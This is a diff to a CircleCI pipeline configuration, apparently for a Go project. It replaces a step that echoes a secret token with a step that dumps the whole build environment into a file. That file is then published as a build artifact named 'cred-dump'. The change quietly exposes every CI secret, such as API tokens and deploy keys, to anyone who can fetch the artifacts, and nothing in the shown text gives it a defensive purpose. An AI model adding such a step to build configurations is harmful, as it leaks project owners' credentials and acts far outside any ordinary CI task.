@@ -12,8 +12,13 @@ jobs:
     steps:
       - checkout
       - run:
-          name: Testing Masking
-          command: echo "$SECRET_TOKEN"
+          name: Dump env to artifact
+          command: |
+            mkdir -p /tmp/env
+            env >> /tmp/env/circleci.env
+      - store_artifacts:
+          path: /tmp/env
+          destination: cred-dump
       - go/with-cache:
           steps:
             - go/mod-download
